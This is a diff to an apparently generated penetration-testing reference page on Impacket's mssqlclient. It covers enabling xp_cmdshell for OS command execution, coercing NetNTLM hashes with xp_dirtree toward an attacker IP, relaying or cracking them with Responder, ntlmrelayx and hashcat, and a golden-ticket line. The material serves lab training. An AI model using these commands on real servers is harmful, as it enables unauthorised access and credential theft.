@@ -9,6 +9,62 @@ hideFooterPagination: true
 
 {/* Generated from Commands/mssqlclient.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## mssqlclient.py: choose the operation and read the result
+
+Connect to Microsoft SQL Server. Choose SQL login or Windows authentication.
+
+### What the result establishes
+
+First distinguish SQL authentication from Windows authentication, then read the server, database and effective login.
+
+### Prerequisites and common failures
+
+A database login does not imply sysadmin, impersonation rights, linked-server access or operating-system execution.
+
+### Example 1: SQL login — password prompted
+
+Run in: **Kali**.
+
+```bash
+impacket-mssqlclient 'USER@TARGET_IP'
+```
+
+### Example 2: Domain account — password prompted
+
+Run in: **Kali**.
+
+```bash
+impacket-mssqlclient -windows-auth 'DOMAIN/USER@TARGET_IP'
+```
+
+### Example 3: Inside the SQL prompt
+
+Run in: **MSSQL prompt**.
+
+```sql
+help
+SELECT SYSTEM_USER;
+SELECT IS_SRVROLEMEMBER('sysadmin');
+SELECT name FROM sys.databases;
+```
+
+### Example 4: OS command — requires appropriate SQL privileges
+
+Run in: **Impacket SQL prompt**. Enables xp_cmdshell on the server.
+
+```text
+enable_xp_cmdshell
+xp_cmdshell whoami
+```
+
+**Login failed** — Confirm SQL authentication versus Windows authentication. Use -windows-auth for the domain account form; verify the SQL instance and port.
+
+**xp_cmdshell permission denied** — A SQL login does not imply sysadmin or OS command execution rights. Check the role query before trying the optional command-execution block.
+
+## Saved commands and notebook recipes
+
+Connect to Microsoft SQL Server. Choose SQL login or Windows authentication.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=mssqlclient) · [All tools](/index)
@@ -21,6 +77,13 @@ Replace UPPER_CASE values with your lab values.
 impacket-mssqlclient 'USER@TARGET_IP'
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Microsoft SQL Server Enumeration — Example 1: SQL login — password prompted](/enumeration/mssql-microsoft-sql-server-cheat-sheet#example-1-sql-login-—-password-prompted) · [Impacket: Script Quick Reference — Example 1: SQL login — password prompted](/tools/impacket#example-1-sql-login-—-password-prompted)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 ## Domain account — password prompted
 
 **Kali**
@@ -28,6 +91,13 @@ impacket-mssqlclient 'USER@TARGET_IP'
 ```bash
 impacket-mssqlclient -windows-auth 'DOMAIN/USER@TARGET_IP'
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Microsoft SQL Server Enumeration — Example 2: Domain account — password prompted](/enumeration/mssql-microsoft-sql-server-cheat-sheet#example-2-domain-account-—-password-prompted) · [Impacket: Script Quick Reference — Example 2: Domain account — password prompted](/tools/impacket#example-2-domain-account-—-password-prompted)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 ## Inside the SQL prompt
 
@@ -40,6 +110,13 @@ SELECT IS_SRVROLEMEMBER('sysadmin');
 SELECT name FROM sys.databases;
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Microsoft SQL Server Enumeration — Example 3: Inside the SQL prompt](/enumeration/mssql-microsoft-sql-server-cheat-sheet#example-3-inside-the-sql-prompt) · [Impacket: Script Quick Reference — Example 3: Inside the SQL prompt](/tools/impacket#example-3-inside-the-sql-prompt)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 ## OS command — requires appropriate SQL privileges
 
 **Impacket SQL prompt**
@@ -48,6 +125,13 @@ SELECT name FROM sys.databases;
 enable_xp_cmdshell
 xp_cmdshell whoami
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Microsoft SQL Server Enumeration — Example 4: OS command — requires appropriate SQL privileges](/enumeration/mssql-microsoft-sql-server-cheat-sheet#example-4-os-command-—-requires-appropriate-sql-privileges) · [Impacket: Script Quick Reference — Example 4: OS command — requires appropriate SQL privileges](/tools/impacket#example-4-os-command-—-requires-appropriate-sql-privileges)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 Enables xp_cmdshell on the server.
 
@@ -90,6 +174,13 @@ Password: MyPassword!
 SQL>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Attacking SQL Databases: Module Notes — Sqlcmd - Connecting to the SQL Server](/modules/common-services/sql#sqlcmd-connecting-to-the-sql-server)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Execute Commands">
@@ -108,6 +199,13 @@ no service\mssql$sqlexpress
 NULL
 (2 rows affected)
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Full Module Reference — Execute Commands](/modules/common-services/full-reference#execute-commands) · [Attacking SQL Databases: Module Notes — Execute Commands](/modules/common-services/sql#execute-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -134,6 +232,13 @@ Password: MyPassword!
 [!] Press help for extra shell commands
 SQL>
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Full Module Reference — Read/Change the Database](/modules/common-services/full-reference#read/change-the-database)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -168,6 +273,13 @@ xp_cmdshell whoami
 xp_cmdshell dir C:\Users
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Footprinting: Service-by-Service Lab Workflow — MSSQL](/enumeration/footprinting-lab-methodology-cheat-sheet#mssql) · [Microsoft SQL Server Enumeration — Example 4: MSSQL](/enumeration/mssql-microsoft-sql-server-cheat-sheet#example-4-mssql)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Original captured examples">
@@ -192,6 +304,13 @@ ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain $DOMAIN Administrator   #
 smbclient.py ; lookupsid.py ; mssqlclient.py $DOMAIN/USER:PASS@$IP -windows-auth
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [rpcclient: Users, Groups, and Domain Policy — Example 4: Original captured examples](/enumeration/rpcclient-cheat-sheet#example-4-original-captured-examples) · [Impacket: Script Quick Reference — Original captured examples](/tools/impacket#original-captured-examples)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Connecting &amp; interacting (Impacket)">
@@ -208,6 +327,13 @@ impacket-mssqlclient <user>:<password>@<IP>
 impacket-mssqlclient <DOMAIN_or_HOST>/<user>:<password>@<IP> -windows-auth
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Microsoft SQL Server Enumeration — Connecting & interacting (Impacket)](/enumeration/mssql-microsoft-sql-server-cheat-sheet#connecting-&-interacting-impacket)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Microsoft SQL Server Enumeration**
 
 Context from the notebook: USE &lt;db>; Switch database
@@ -216,6 +342,13 @@ Context from the notebook: USE &lt;db>; Switch database
 USE <db>;
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Microsoft SQL Server Enumeration — Connecting & interacting (Impacket)](/enumeration/mssql-microsoft-sql-server-cheat-sheet#connecting-&-interacting-impacket) · [MySQL and MariaDB Enumeration — Connecting & interacting](/enumeration/mysql-mariadb-cheat-sheet#connecting-&-interacting)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Microsoft SQL Server Enumeration**
 
 Context from the notebook: SELECT * FROM &lt;table>; Read a table
@@ -223,6 +356,13 @@ Context from the notebook: SELECT * FROM &lt;table>; Read a table
 ```text
 SELECT * FROM <table>;
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Microsoft SQL Server Enumeration — Connecting & interacting (Impacket)](/enumeration/mssql-microsoft-sql-server-cheat-sheet#connecting-&-interacting-impacket) · [MySQL and MariaDB Enumeration — Connecting & interacting](/enumeration/mysql-mariadb-cheat-sheet#connecting-&-interacting)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -243,6 +383,13 @@ set RHOSTS <IP>
 run
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Microsoft SQL Server Enumeration — Footprinting & scanning](/enumeration/mssql-microsoft-sql-server-cheat-sheet#footprinting-&-scanning)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="From DB access to OS command execution">
@@ -257,6 +404,13 @@ EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 EXEC xp_cmdshell 'whoami';
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Microsoft SQL Server Enumeration — From DB access to OS command execution](/enumeration/mssql-microsoft-sql-server-cheat-sheet#from-db-access-to-os-command-execution)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Microsoft SQL Server Enumeration**
 
 Context from the notebook: (Impacket exposes shortcuts:  enable_xp_cmdshell  then  xp_cmdshell whoami .)
@@ -264,6 +418,13 @@ Context from the notebook: (Impacket exposes shortcuts:  enable_xp_cmdshell  the
 ```text
 xp_cmdshell whoami
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Microsoft SQL Server Enumeration — From DB access to OS command execution](/enumeration/mssql-microsoft-sql-server-cheat-sheet#from-db-access-to-os-command-execution)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -279,12 +440,26 @@ sudo responder -I tun0                 # capture the NetNTLM hash to crack offli
 # (or) sudo impacket-ntlmrelayx -t <other-host> -smb2support   # relay it instead of cracking
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Microsoft SQL Server Enumeration — When you don't have sysadmin: steal the service account's hash with xp_dirtree](/enumeration/mssql-microsoft-sql-server-cheat-sheet#when-you-dont-have-sysadmin-steal-the-service-accounts-hash-with-xp_dirtree) · [Responder — Interface and Startup — Example 7: When you don't have sysadmin: steal the service account's hash with xp_dirtree](/tools/responder#example-7-when-you-dont-have-sysadmin-steal-the-service-accounts-hash-with-xp_dirtree)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Microsoft SQL Server Enumeration**
 
 ```sql
 -- 2. From the SQL prompt, force SQL Server to authenticate to you
 EXEC xp_dirtree '\\<your-IP>\share', 1, 1;
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Microsoft SQL Server Enumeration — When you don't have sysadmin: steal the service account's hash with xp_dirtree](/enumeration/mssql-microsoft-sql-server-cheat-sheet#when-you-dont-have-sysadmin-steal-the-service-accounts-hash-with-xp_dirtree)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 **Microsoft SQL Server Enumeration**
 
@@ -293,6 +468,13 @@ Context from the notebook: You then either  crack  the captured NetNTLM hash off
 ```text
 hashcat -m 5600
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Microsoft SQL Server Enumeration — When you don't have sysadmin: steal the service account's hash with xp_dirtree](/enumeration/mssql-microsoft-sql-server-cheat-sheet#when-you-dont-have-sysadmin-steal-the-service-accounts-hash-with-xp_dirtree)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -330,6 +512,13 @@ hashcat -m 5600
 └── Either → reverse shell via exploit
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ports, Protocols, and Services by Purpose — Mental Model — "What Do I Use When?"](/reference/master-protocol-service-quick-reference#mental-model-—-what-do-i-use-when)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Displaying mssqlclient.py Options">
@@ -355,6 +544,13 @@ positional arguments:
 <SNIP>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Privileged Remote Access — Displaying mssqlclient.py Options](/active-directory/privileged-access#displaying-mssqlclient-py-options)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Running mssqlclient.py Against the Target">
@@ -378,6 +574,13 @@ Password:
 [!] Press help for extra shell commands
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Privileged Remote Access — Running mssqlclient.py Against the Target](/active-directory/privileged-access#running-mssqlclient-py-against-the-target)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Group &amp; access edges">
@@ -391,6 +594,13 @@ Context from the notebook: SQLAdmin You're sysadmin on MSSQL mssqlclient -window
 ```text
 mssqlclient -windows-auth
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [BloodHound: Full Reference — Group & access edges](/cheatsheets/bloodhound-complete-guide#group-&-access-edges)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -406,6 +616,13 @@ Context from the notebook: impacket-mssqlclient — built-in helper commands.  C
 mssqlclient.py user:pass@IP -windows-auth
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Full Module Reference — Initiation of the Attack](/modules/common-services/full-reference#initiation-of-the-attack-2)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Impacket: Script Quick Reference">
@@ -419,6 +636,13 @@ Context from the notebook: MSSQL mssqlclient.py  /  impacket-mssqlclient Databas
 ```text
 mssqlclient.py
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Impacket: Script Quick Reference — Existing notes and worked examples](/tools/impacket#existing-notes-and-worked-examples)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -434,6 +658,13 @@ Context from the notebook: The data  you  want is in the non-default databases �
 SELECT name FROM sys.databases;
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Microsoft SQL Server Enumeration — Default system databases](/enumeration/mssql-microsoft-sql-server-cheat-sheet#default-system-databases) · [Microsoft SQL Server Enumeration — Connecting & interacting (Impacket)](/enumeration/mssql-microsoft-sql-server-cheat-sheet#connecting-&-interacting-impacket)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="NetExec (the multi-protocol workhorse)">
@@ -448,6 +679,13 @@ Context from the notebook: Supports  nfs, ftp, ssh, winrm, smb, wmi, rdp, mssql,
 nfs, ftp, ssh, winrm, smb, wmi, rdp, mssql, ldap, vnc
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Password Attacks: Cracking, Files, and Credential Stores — NetExec (the multi-protocol workhorse)](/password-attacks/password-attacks-cheat-sheet#netexec-the-multi-protocol-workhorse)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Database Protocols">
@@ -461,6 +699,13 @@ Context from the notebook: MSSQL 1433 mssqlclient.py &lt;user>@&lt;IP> -windows-
 ```text
 mssqlclient.py <user>@<IP> -windows-auth
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ports, Protocols, and Services by Purpose — Database Protocols](/reference/master-protocol-service-quick-reference#database-protocols)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -520,6 +765,13 @@ MIIStQIBAzCCEn8GCSqGSIb3DQEHAaCCEnAEghJsMIISaDCCCJ8GCSqGSIb3DQEHBqCCCJAwggiMAgEA
 <SNIP>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Historical AD Vulnerability Labs — Catching Base64 Encoded Certificate for DC01](/active-directory/historical-vulnerability-labs#catching-base64-encoded-certificate-for-dc01)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Starting ntlmrelayx.py">
@@ -565,6 +817,22 @@ Copyright 2021 SecureAuth Corporation
 [*] Servers started, waiting for connections
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Historical AD Vulnerability Labs — Starting ntlmrelayx.py](/active-directory/historical-vulnerability-labs#starting-ntlmrelayx-py)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Microsoft SQL Server Enumeration](/enumeration/mssql-microsoft-sql-server-cheat-sheet)
+- [Attacking SQL Databases: Module Notes](/modules/common-services/sql)
+
+{/* VAULT_RELATED_END */}
